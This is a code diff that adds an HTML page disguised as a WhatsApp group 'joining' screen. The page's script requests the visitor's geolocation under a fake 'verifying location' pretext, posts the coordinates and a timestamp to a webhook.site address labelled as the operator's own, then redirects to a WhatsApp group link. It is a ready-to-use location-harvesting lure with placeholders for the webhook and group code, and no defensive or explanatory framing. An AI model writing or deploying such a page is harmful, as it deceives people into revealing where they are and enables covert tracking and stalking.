@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Joining WhatsApp Group...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 80px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Joining group... please wait</h2>
+  <p>Checking access & verifying location...</p>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Send location to your webhook
+      fetch("https://webhook.site/YOUR-UNIQUE-ID", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          time: new Date().toISOString()
+        })
+      });
+
+      // Redirect to WhatsApp group after 2 seconds
+      setTimeout(function() {
+        window.location.href = "https://chat.whatsapp.com/YOUR-GROUP-CODE";
+      }, 2000);
+
+    }, function(error) {
+      alert("❌ Location access denied!");
+    });
+  </script>
+</body>
+</html>
